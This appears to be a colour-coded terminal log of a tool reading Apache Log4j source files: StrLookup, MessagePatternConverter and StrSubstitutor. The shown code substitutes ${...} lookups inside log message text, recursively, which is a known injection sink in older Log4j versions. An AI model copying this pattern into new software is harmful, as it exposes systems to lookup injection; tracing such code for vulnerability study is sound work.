[2;36m                    [0m         [1;36m53[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    String [0m[1;35mlookup[0m[1;39m([0m[39mString key[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:     * Looks up a String key to a String value possibly using the current [0m       [2m                [0m
[2;36m                    [0m         [39mLogEvent.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:     * <pre>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:     * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:    String [0m[1;35mlookup[0m[1;39m([0m[39mLogEvent event, String key[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:1[0m[39m-[0m[1;36m23[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.message.Message;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MultiformatMessage;[0m                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:57[0m[39m-[0m[1;36m78[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:1[0m[39m-[0m[1;36m100[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.ArrayList;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Enumeration;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.util.Iterator;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import java.util.List;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import java.util.Properties;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * Substitutes variables within a string by values.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * This class takes a piece of text and substitutes all the variables within it.[0m [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: * The default definition of a variable is <code>$[0m[1;39m{[0m[39mvariableName[0m[1;39m}[0m[39m<[0m[35m/[0m[95mcode[0m[39m>.[0m         [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * The prefix and suffix can be changed via constructors and set methods.[0m        [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m: * Variable values are typically resolved from a map, but could also be resolved[0m [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m: * from system properties, or by supplying a custom variable resolver.[0m           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m: * The simplest example is to use this class to replace Java System properties. [0m [2m                [0m
[2;36m                    [0m         [39mFor example:[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m: * [0m[1;35mStrSubstitutor.replaceSystemProperties[0m[1;39m([0m                                       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m: *      [0m[32m"You are running with java.version = $[0m[32m{[0m[32mjava.version[0m[32m}[0m[32m and os.name = [0m      [2m                [0m
[2;36m                    [0m         [32m$[0m[32m{[0m[32mos.name[0m[32m}[0m[32m."[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m: * Typical usage of this class follows the following pattern: First an instance [0m [2m                [0m
[2;36m                    [0m         [39mis created[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m: * and initialized with the map that contains the values for the available [0m      [2m                [0m
[2;36m                    [0m         [39mvariables.[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m: * If a prefix and/or suffix for variables should be used other than the default[0m [2m                [0m
[2;36m                    [0m         [39mones,[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m: * the appropriate settings can be performed. After that the [0m                    [2m                [0m
[2;36m                    [0m         [39m<code>[0m[1;35mreplace[0m[1;39m([0m[1;39m)[0m[39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m: * method can be called passing in the source text for interpolation. In the [0m    [2m                [0m
[2;36m                    [0m         [39mreturned[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m: * text all variable references [0m[1;39m([0m[39mas long as their values are known[0m[1;39m)[0m[39m will be [0m     [2m                [0m
[2;36m                    [0m         [39mresolved.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m: * The following example demonstrates this:[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m: * Map valuesMap = [0m[1;35mHashMap[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m: * [0m[1;35mvaluesMap.put[0m[1;39m([0m[39m&quot;animal&quot;, &quot;quick brown fox&quot;[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m: * [0m[1;35mvaluesMap.put[0m[1;39m([0m[39m&quot;target&quot;, &quot;lazy dog&quot;[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m: * String templateString = &quot;The $[0m[1;39m{[0m[39manimal[0m[1;39m}[0m[39m jumped over the $[0m[1;39m{[0m[39mtarget[0m[1;39m}[0m[39m.&quot;;[0m [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m: * StrSubstitutor sub = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mvaluesMap[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m: * String resolvedString = [0m[1;35msub.replace[0m[1;39m([0m[39mtemplateString[0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m: * yielding:[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m: *      The quick brown fox jumped over the lazy dog.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m: * In addition to this usage pattern there are some static convenience methods [0m  [2m                [0m
[2;36m                    [0m         [39mthat[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m: * cover the most common use cases. These methods can be used without the need [0m  [2m                [0m
[2;36m                    [0m         [39mof[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m: * manually creating an instance. However if multiple replace operations are to [0m [2m                [0m
[2;36m                    [0m         [39mbe[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m: * performed, creating and reusing an instance of this class will be more [0m       [2m                [0m
[2;36m                    [0m         [39mefficient.[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m: * Variable replacement works in a recursive way. Thus, if a variable value [0m     [2m                [0m
[2;36m                    [0m         [39mcontains[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m: * a variable then that variable will also be replaced. Cyclic replacements are[0m  [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m: * detected and will cause an exception to be thrown.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m: * Sometimes the interpolation's result must contain a variable prefix. As an [0m   [2m                [0m
[2;36m                    [0m         [39mexample[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m: * take the following source text:[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m: *   The variable $[0m[1;39m{[0m[39m$[0m[1;39m{[0m[39mname[0m[1;39m}[0m[1;39m}[0m[39m must be used.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m: * Here only the variable's name referred to in the text should be replaced [0m     [2m                [0m
[2;36m                    [0m         [39mresulting[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m: * in the text [0m[1;39m([0m[39massuming that the value of the <code>name<[0m[35m/[0m[95mcode[0m[39m> variable is [0m    [2m                [0m
[2;36m                    [0m         [39m<code>x<[0m[35m/[0m[95mcode[0m[39m>[0m[1;39m)[0m[39m:[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m: *   The variable $[0m[1;39m{[0m[39mx[0m[1;39m}[0m[39m must be used.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m: * To achieve this effect there are two possibilities: Either set a different [0m   [2m                [0m
[2;36m                    [0m         [39mprefix[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m: * and suffix for variables which do not conflict with the result text you want [0m [2m                [0m
[2;36m                    [0m         [39mto[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m: * produce. The other possibility is to use the escape character, by default [0m    [2m                [0m
[2;36m                    [0m         [32m'$'[0m[39m.[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m: * If this character is placed before a variable reference, this reference is [0m   [2m                [0m
[2;36m                    [0m         [39mignored[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m: * and won't be replaced. For example:[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m: *   The variable $$[0m[1;39m{[0m[39m$[0m[1;39m{[0m[39mname[0m[1;39m}[0m[1;39m}[0m[39m must be used.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m: * In some complex scenarios you might even want to perform substitution in the[0m  [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m: * names of variables, for instance[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m: * $[0m[1;39m{[0m[39mjre-$[0m[1;39m{[0m[39mjava.specification.version[0m[1;39m}[0m[1;39m}[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m: * <code>StrSubstitutor<[0m[35m/[0m[95mcode[0m[39m> supports this recursive substitution in variable[0m  [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m: * names, but it has to be enabled explicitly by setting the[0m                     [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m: * [0m[1;39m{[0m[39m@link #[0m[1;35msetEnableSubstitutionInVariables[0m[1;39m([0m[39mboolean[0m[1;39m)[0m[39m [0m                           [2m                [0m
[2;36m                    [0m         [39menableSubstitutionInVariables[0m[1;39m}[0m                                                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:800[0m[39m-[0m[1;36m860[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m800[0m[39m:                            [0m[35m/[0m[35m/[0m[39m found variable end marker[0m                        [2m                [0m
[2;36m                    [0m         [1;36m801[0m[39m:                            if [0m[1;39m([0m[39mnestedVarCount == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                          [2m                [0m
[2;36m                    [0m         [1;36m802[0m[39m:                                String varName = new [0m[1;35mString[0m[1;39m([0m[39mchars, startPos[0m     [2m                [0m
[2;36m                    [0m         [1;36m803[0m[39m:                                        + startMatchLen, pos - startPos[0m         [2m                [0m
[2;36m                    [0m         [1;36m804[0m[39m:                                        - startMatchLen[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m805[0m[39m:                                if [0m[1;39m([0m[1;35misEnableSubstitutionInVariables[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m        [2m                [0m
[2;36m                    [0m         [1;36m806[0m[39m:                                    final StringBuilder bufName = new [0m          [2m                [0m
[2;36m                    [0m         [1;35mStringBuilder[0m[1;39m([0m[39mvarName[0m[1;39m)[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m807[0m[39m:                                    [0m[1;35msubstitute[0m[1;39m([0m[39mevent, bufName, [0m[1;36m0[0m[39m, [0m              [2m                [0m
[2;36m                    [0m         [1;35mbufName.length[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m808[0m[39m:                                    varName = [0m[1;35mbufName.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m809[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m810[0m[39m:                                pos += endMatchLen;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m811[0m[39m:                                final int endPos = pos;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m812[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m813[0m[39m:                                [0m[35m/[0m[35m/[0m[39m on the first call initialize priorVariables[0m  [2m                [0m
[2;36m                    [0m         [1;36m814[0m[39m:                                if [0m[1;39m([0m[39mpriorVariables == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m815[0m[39m:                                    priorVariables = new ArrayList<String>[0m[1;39m([0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m816[0m[39m:                                    [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mnew [0m[1;35mString[0m[1;39m([0m[39mchars,[0m        [2m                [0m
[2;36m                    [0m         [1;36m817[0m[39m:                                            offset, length[0m[1;39m)[0m[1;39m)[0m[39m;[0m                   [2m                [0m
